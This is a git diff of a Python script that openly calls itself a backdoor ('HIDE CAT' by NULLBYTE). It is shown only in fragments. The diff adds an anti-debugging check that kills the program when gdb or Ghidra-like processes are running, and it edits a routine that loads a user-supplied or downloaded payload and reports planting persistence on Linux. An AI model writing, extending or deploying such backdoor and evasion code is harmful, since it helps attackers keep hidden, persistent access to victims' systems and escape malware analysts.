@@ -1,10 +1,12 @@
 #!/usr/bin/python3
-# BACKDOOR MADE BY 1337
+# BACKDOOR MADE BY NULLBYTE
+# Github: https://github.com/NullByte-7w7
 
 import os
 from colorama import Fore
 import sys
 from urllib.request import urlretrieve
+import psutil
 
 def check_system():
 
@@ -18,11 +20,14 @@ def check_system():
 
 
 
-#def check_debugger_linux():
+def check_debugger_linux():
 
-
-
-
+     for proc in psutil.process_iter(['pid','name']):     
+            debuggers = {'gidra','gdb'}
+            for debug in debuggers:    
+                if debug in proc.info['name'].lower():
+                    print("[!] FOUND PROCESS DEBUGGER")
+                    sys.exit(1)
 
 
 
@@ -46,17 +51,16 @@ def external_backdoor_linux():
         if os.path.exists(dst):
             print(Fore.MAGENTA + f"[7w7] Payload Found In -> {dst}")
             print(Fore.GREEN + "[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
-
         else:
-            print(Fore.RED + "[!] Payload Not Found")
+            print(Fore.RED + "[!] Payload Not Found => ")
             sys.exit(1)
     elif "local" in choice_payload_attacker:
         path_payload = input("[#] PATH YOUR PAYLOAD => ")
         access_payload = os.path.exists(path_payload)
         if access_payload:
-            print(Fore.GREEN + "[$] LOADING PAYLOAD...")
+            print(Fore.GREEN + "[1337] IMPLEMENTED PERSITENCE IN  PAYLOAD")
         else:
-            print(Fore.RED + "[!] NOT FOUND PATH PAYLOAD TRY AGAIN!")
+            print(Fore.RED + f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
     else:
         print(Fore.RED + "[!] ?????? TRY AGAIN -> surface or local")
 
@@ -83,13 +87,14 @@ print(Fore.RED + r'''
             .*' /  .*' ; .*`- +'  `*' 
             `*-*   `*-*  `*-*'
 
-    HIDE CAT ||NULLBYTE||
+    H1D3 C4T ||NULLBYTE||
 ''')
 
 print(Fore.GREEN + "-----------------------------------------------")
 print(Fore.WHITE + "[!] Checking Operating System...")
 check_system()
-
+print(Fore.GREEN + "[!] Checking Anti-Malware/Debuggers Running...")
+check_debugger_linux()
 print(Fore.GREEN + "-----------------------------------------------")
 
 if "linux" in check_system():
